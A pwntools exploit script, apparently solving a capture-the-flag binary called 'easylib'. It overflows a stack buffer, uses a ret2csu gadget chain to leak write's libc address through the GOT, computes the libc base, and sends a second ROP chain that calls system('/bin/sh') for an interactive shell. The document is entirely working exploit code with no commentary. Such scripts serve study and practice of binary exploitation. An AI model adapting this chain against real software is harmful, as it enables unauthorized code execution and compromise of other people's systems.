from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

elf = ELF('./easylib')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

global_debug = 1
gadget1 = 0x40075A
gadget2 = 0x400740

prdi = 0x0000000000400763 #: pop rdi ; ret
prsi = 0x0000000000400761 #: pop rsi ; pop r15 ; ret
write_plt = 0x400520
write_got = 0x601018
main = 0x4006B9

io = process('./easylib')

payload = b'a'*0x88 + p64(gadget1)
payload += p64(0)
payload += p64(1)
payload += p64(write_got)
payload += p64(1)
payload += p64(write_got)
payload += p64(8)

payload += p64(gadget2)
payload += p64(0) * 7
payload += p64(main)
io.send(payload)


addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success(hex(addr))

libc_base = addr - libc.sym['write']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search('/bin/sh'))
log.success(hex(system))
log.success(hex(binsh))

gdb.attach(io)

payload = b'a'*0x88 + p64(prdi) + p64(binsh) + p64(prsi) + p64(0)*2 + p64(system)
io.send(payload)


io.interactive()

